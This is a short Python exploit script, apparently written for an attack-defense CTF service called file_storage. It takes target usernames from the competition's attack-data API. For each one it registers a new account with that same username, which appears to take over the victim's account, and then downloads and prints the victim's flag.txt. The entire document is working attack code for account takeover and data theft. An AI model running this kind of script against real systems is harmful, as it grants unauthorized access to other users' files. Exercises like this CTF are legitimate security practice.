#!/usr/bin/env python3
import requests, json, re, sys, uuid, time, random
from bs4 import BeautifulSoup

host = sys.argv[1]
s = requests.Session()

def parse_atckdat(service_name):
    global host
    api = "https://live.mephictf.ru/api/client/attack_data/"
    s = requests.Session()
    req = s.get(api)
    data = req.json()
    pre_res = data.get(service_name, {})
    return pre_res[host]



for username in parse_atckdat("file_storage"):
    s = requests.Session()
    req = s.post(f"http://{host}:5000/register", data={"username": username, "password": "asd"})
    req = s.get(f"http://{host}:5000/my_files")
    soup = BeautifulSoup(req.text, "html.parser")
    files = soup.select("ul.file-list a")
    found_file = next(
        (file["href"] for file in files if "flag.txt" in file.text), None
    )
    if found_file:
        result = s.get(f"http://{host}:5000{found_file}").text

    print(result, flush=True)

